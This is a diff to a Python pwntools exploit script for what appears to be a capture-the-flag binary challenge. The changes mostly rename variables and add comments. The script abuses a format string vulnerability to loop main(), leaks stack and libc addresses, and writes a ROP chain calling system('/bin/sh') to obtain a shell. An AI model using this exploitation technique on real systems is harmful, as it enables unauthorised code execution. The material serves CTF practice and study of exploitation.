@@ -30,16 +30,22 @@ else:
 # . . .
 # 06:0030│   0x7fffffffed30 —▸ 0x7fffffffed00 —▸ 0x7fffffffed08 ◂— 0x0
 
-# the idea for solving the challenge came to me from looking at this section of the stack: 
-# we can access values 0x7fffffffed08 (at 0x7fffffffed00) and 0x7fffffffed00 (at 0x7fffffffed30) 
-# using direct parameter access in format strings to write arbitrary values at, for example, 
+# the idea for solving the challenge came to me from looking at this section of the stack:
+# we can access values 0x7fffffffed08 (at 0x7fffffffed00) and 0x7fffffffed00 (at 0x7fffffffed30)
+# using direct parameter access in format strings to write arbitrary values at, for example,
 # 0x7fffffffed08 and at the following addresses (0x7fffffffed08+0x8 and 0x7fffffffed08+0x10)
 
-# TL;DR 
+# TL;DR
 # it happens that a single format string vulnerability can be used to:
 # - modify a saved RBP in the stack to execute _start() when main() returns (thus executing main() again)
 # - write in the stack a small part of a ROP chain
 # this process can be repeated until the full chain is written and finally executed
+
+# (instead of a full ROP chain, it should be enough to execute any of the single magic gadgets,
+# although they did not work in my experiments—most probably because I messed up in the rush
+# to solve the challenge)
+
+# (because of ASLR, this script is not 100% reliable—you may need to run it a bunch of times)
 
 ###############################################################################
 
@@ -58,7 +64,7 @@ io.recvuntil('Is it?')
 # 08:0040│          0x7fffffffed40 —▸ 0x7fffffffed70 —▸ 0x555555554990 (__libc_csu_init) ◂— push   r1
 
 # use the format string to modify the last byte of saved RBP at 0x7fffffffed40 to point to 0x7fffffffed08-0x8
-# in this way, _start() will be executed when main() returns
+# in this way, _start() is going to be executed when main() returns
 new_saved_rbp_lsb = (stack_lsb_leak - 0x7) + ((0x7fffffffed08 - 0x8) - 0x7fffffffed30)
 if new_saved_rbp_lsb < 0: error('Bad ASLR luck! Try again')
 
@@ -70,29 +76,18 @@ io.sendline('{}%6$hhn%6$p%17$p'.format('' if new_saved_rbp_lsb == 0x0 else '%{}x
 io.recvn(new_saved_rbp_lsb)
 
 # receive the stack leak
-stack_leak = int(io.recvn(14), 16)  # 0x7fffffffed40
-success('stack_leak: %s' % hex(stack_leak))
+a_stack_address = int(io.recvn(14), 16)  # 0x7fffffffed40
+success('a_stack_address: %s' % hex(a_stack_address))
 
 # receive the libc leak and compute the base address
-libc_leak = int(io.recvn(14), 16)  # 0x7ffff7a303f1 (__libc_start_main+241)
+a_libc_address = int(io.recvn(14), 16)  # 0x7ffff7a303f1 (__libc_start_main+241)
 if args['REMOTE']:
     # ./libc.so.6                       __libc_start_main+240
-    libc.address = libc_leak - 0x0000000000020740 - 240
+    libc.address = a_libc_address - 0x0000000000020740 - 240
 else:
     # ./libc6_2.24-9ubuntu2.2_amd64     __libc_start_main+241
-    libc.address = libc_leak - 0x0000000000020300 - 241
+    libc.address = a_libc_address - 0x0000000000020300 - 241
 success('libc.address: %s' % hex(libc.address))
-
-# now that the address of libc is known, build the ROP chain
-rop = ROP(libc)
-rop.system(next(libc.search('/bin/sh')))
-raw_rop = str(rop)
-pop_rdi_ret = u64(raw_rop[:8])
-bin_sh_address = u64(raw_rop[8:16])
-system_address = u64(raw_rop[16:24])
-
-# compute the stack address where the ROP will be stored
-rop_stack_address = stack_leak + (0x7fffffffed08 - 0x7fffffffed40)
 
 ###############################################################################
 
@@ -104,35 +99,47 @@ rop_stack_address = stack_leak + (0x7fffffffed08 - 0x7fffffffed40)
 
 # repeat the process multiple times to write the full ROP
 
+rop = ROP(libc)
+rop.system(next(libc.search('/bin/sh')))
+raw_rop = str(rop)
+pop_rdi_ret_address = u64(raw_rop[:8])
+bin_sh_address = u64(raw_rop[8:16])
+system_address = u64(raw_rop[16:24])
 
-def exec_format_string_and_back_to__start(_start_address, target_value, target_address, n_param1,
-                                          n_param2):
+# compute the stack address where the ROP is going to be stored
+rop_stack_address = a_stack_address + (0x7fffffffed08 - 0x7fffffffed40)
+
+
+def exec_format_string_and_back_to__start(_start_address, what_to_write, next_where_to_write,
+                                          i_param1, i_param2):
     new_saved_rbp_lsb = _start_address & 0xffff
     a = new_saved_rbp_lsb
-    b = target_value - a if target_value > a else 0x10000 + target_value - a
-    c = target_address - target_value if target_address > target_value else 0x10000 + target_address - target_value
-    io.sendline('%{a}x%6$hn%{b}x%{n_param1}$hn%{c}x%{n_param2}$hhn'.format(
-        a=a, b=b, c=c, n_param1=n_param1, n_param2=n_param2))
+    b = what_to_write - a if what_to_write > a else 0x10000 + what_to_write - a
+    c = next_where_to_write - what_to_write if next_where_to_write > what_to_write else 0x10000 + next_where_to_write - what_to_write
+    io.sendline('%{a}x%6$hn%{b}x%{i_param1}$hn%{c}x%{i_param2}$hhn'.format(
+        a=a, b=b, c=c, i_param1=i_param1, i_param2=i_param2))
 
 
 # compute the address of _start() in the stack and indexes for direct parameter access in format strings
-_start_address = stack_leak + ((0x7fffffffec70 - 0x8) - 0x7fffffffed40)
-n_param1 = 42
-n_param2 = 48
+_start_address = a_stack_address + ((0x7fffffffec70 - 0x8) - 0x7fffffffed40)
+i_param1 = 42
+i_param2 = 48
 
-curr_rop_address = rop_stack_address
-for gadget_address in (pop_rdi_ret, bin_sh_address, system_address):
+curr_rop_stack_address = rop_stack_address
+for gadget_address in (pop_rdi_ret_address, bin_sh_address, system_address):
     for i in range(3):
         part_of_gadget_address = (gadget_address >> (16 * i)) & 0xffff
-        next_address = (curr_rop_address + 2**(i + 1)) & 0xff
-        exec_format_string_and_back_to__start(_start_address, part_of_gadget_address, next_address,
-                                              n_param1, n_param2)
+        next_rop_stack_address_lsb = (curr_rop_stack_address + 2**(i + 1)) & 0xff
+
+        # write part of the gadget address and move the pointer on where to write for the next iteration
+        exec_format_string_and_back_to__start(_start_address, part_of_gadget_address,
+                                              next_rop_stack_address_lsb, i_param1, i_param2)
         # _start() got executed and we are back in main
         # adjust offsets for the next execution
         _start_address -= 0x90
-        n_param1 += 18
-        n_param2 += 18
-    curr_rop_address += 0x8
+        i_param1 += 18
+        i_param2 += 18
+    curr_rop_stack_address += 0x8
 
 ###############################################################################
 
@@ -158,7 +165,7 @@ io.interactive()
 #     NX:       NX enabled
 #     PIE:      PIE enabled
 # [+] stack_lsb_leak: 0x57
-# [+] stack_leak: 0x7ffc0a077460
+# [+] a_stack_address: 0x7ffc0a077460
 # [+] libc.address: 0x7f65f47cb000
 # . . .
 #          1$ ls
